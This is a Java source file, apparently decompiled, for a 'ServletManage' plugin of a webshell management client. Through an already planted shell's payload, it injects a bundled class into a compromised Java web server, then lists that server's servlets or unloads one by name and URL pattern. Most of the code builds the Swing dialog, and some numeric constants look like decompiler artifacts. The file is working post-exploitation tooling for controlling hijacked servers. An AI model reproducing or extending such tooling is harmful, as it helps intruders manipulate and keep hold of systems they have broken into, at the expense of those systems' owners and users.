package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.GBC;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Frame;
import java.awt.GridBagLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.io.InputStream;
import javassist.bytecode.Opcode;
import javassist.compiler.TokenId;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(Name = "ServletManage", payloadName = "JavaDynamicPayload")
public class ServletManage implements Plugin {
    private static final String CLASS_NAME = "plugin.ServletManage";
    private Encoding encoding;
    private JButton getAllServletButton = new JButton("GetAllServlet");
    private boolean loadState;
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private RTextArea resultTextArea = new RTextArea();
    private ShellEntity shellEntity;
    private JSplitPane splitPane = new JSplitPane();
    private JButton unLoadServletButton = new JButton("UnLoadServlet");

    public ServletManage() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.getAllServletButton);
        topPanel.add(this.unLoadServletButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
             

            public void componentResized(ComponentEvent e) {
                ServletManage.this.splitPane.setDividerLocation(0.15d);
            }
        });
        this.panel.add(this.splitPane);
    }

    private void getAllServletButtonClick(ActionEvent actionEvent) {
        this.resultTextArea.setText(getAllServlet());
    }

    private void unLoadServletButtonClick(ActionEvent actionEvent) {
        UnServlet unServlet = new UnLoadServletDialog(this.shellEntity.getFrame(), "UnLoadServlet", "", "").getResult();
        if (unServlet.state) {
            String resultString = unLoadServlet(unServlet.wrapperName, unServlet.urlPattern);
            Log.log(resultString, new Object[0]);
            JOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
            return;
        }
        Log.log("用户取消选择.....", new Object[0]);
    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getClassLoader().getResourceAsStream("shell/java/assets/ServletManage.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    Log.log("Load success", new Object[0]);
                    return;
                }
                Log.log("Load fail", new Object[0]);
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    private String getAllServlet() {
        load();
        return this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "getAllServlet", new ReqParameter()));
    }

    private String unLoadServlet(String wrapperName, String urlPattern) {
        load();
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("wrapperName", wrapperName);
        reqParameter.add("urlPattern", urlPattern);
        return this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "unLoadServlet", reqParameter));
    }

    @Override 
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override 
    public JPanel getView() {
        return this.panel;
    }

     
    public class UnServlet {
        public boolean state;
        public String urlPattern;
        public String wrapperName;

        UnServlet() {
        }
    }

    class UnLoadServletDialog extends JDialog {
        private Dimension TextFieldDim;
        private JButton cancelButton;
        private JButton okButton;
        private UnServlet unServlet;
        private JLabel urlPatternLabel;
        private JTextField urlPatternTextField;
        private JLabel wrapperNameLabel;
        private JTextField wrapperNameTextField;

        private UnLoadServletDialog(Frame frame, String tipString, String wrapperNameString, String urlPatternString) {
            super(frame, tipString, true);
            this.TextFieldDim = new Dimension((int) TokenId.BadToken, 23);
            this.unServlet = new UnServlet();
            this.wrapperNameTextField = new JTextField("wrapperNameText", 30);
            this.urlPatternTextField = new JTextField("destText", 30);
            this.wrapperNameLabel = new JLabel("wrapperName");
            this.urlPatternLabel = new JLabel("urlPattern");
            this.okButton = new JButton("unLoad");
            this.cancelButton = new JButton("cancel");
            Dimension TextFieldDim2 = new Dimension((int) Opcode.GOTO_W, 23);
            GBC gbcLSrcFile = new GBC(0, 0).setInsets(5, -40, 0, 0);
            GBC gbcSrcFile = new GBC(1, 0, 3, 1).setInsets(5, 20, 0, 0);
            GBC gbcLDestFile = new GBC(0, 1).setInsets(5, -40, 0, 0);
            GBC gbcDestFile = new GBC(1, 1, 3, 1).setInsets(5, 20, 0, 0);
            GBC gbcOkButton = new GBC(0, 2, 2, 1).setInsets(5, 20, 0, 0);
            GBC gbcCancelButton = new GBC(2, 2, 1, 1).setInsets(5, 20, 0, 0);
            this.wrapperNameTextField.setPreferredSize(TextFieldDim2);
            this.urlPatternTextField.setPreferredSize(TextFieldDim2);
            setLayout(new GridBagLayout());
            add(this.wrapperNameLabel, gbcLSrcFile);
            add(this.wrapperNameTextField, gbcSrcFile);
            add(this.urlPatternLabel, gbcLDestFile);
            add(this.urlPatternTextField, gbcDestFile);
            add(this.okButton, gbcOkButton);
            add(this.cancelButton, gbcCancelButton);
            automaticBindClick.bindJButtonClick(this, this);
            this.addWindowListener(new WindowListener() {
                public void windowOpened(WindowEvent paramWindowEvent) {
                }

                public void windowIconified(WindowEvent paramWindowEvent) {
                }

                public void windowDeiconified(WindowEvent paramWindowEvent) {
                }

                public void windowDeactivated(WindowEvent paramWindowEvent) {
                }

                public void windowClosing(WindowEvent paramWindowEvent) {
                    UnLoadServletDialog.this.cancelButtonClick(null);
                }

                public void windowClosed(WindowEvent paramWindowEvent) {
                }

                public void windowActivated(WindowEvent paramWindowEvent) {
                }
            });
            this.wrapperNameTextField.setText(wrapperNameString);
            this.urlPatternTextField.setText(urlPatternString);
            functions.setWindowSize(this, 650, Opcode.GETFIELD);
            setLocationRelativeTo(frame);
            setDefaultCloseOperation(2);
            setVisible(true);
        }

        public UnServlet getResult() {
            return this.unServlet;
        }

        private void okButtonClick(ActionEvent actionEvent) {
            this.unServlet.state = true;
            changeFileInfo();
        }

         
         
        private void cancelButtonClick(ActionEvent actionEvent) {
            this.unServlet.state = false;
            changeFileInfo();
        }

        private void changeFileInfo() {
            this.unServlet.urlPattern = this.urlPatternTextField.getText();
            this.unServlet.wrapperName = this.wrapperNameTextField.getText();
            dispose();
        }
    }
}
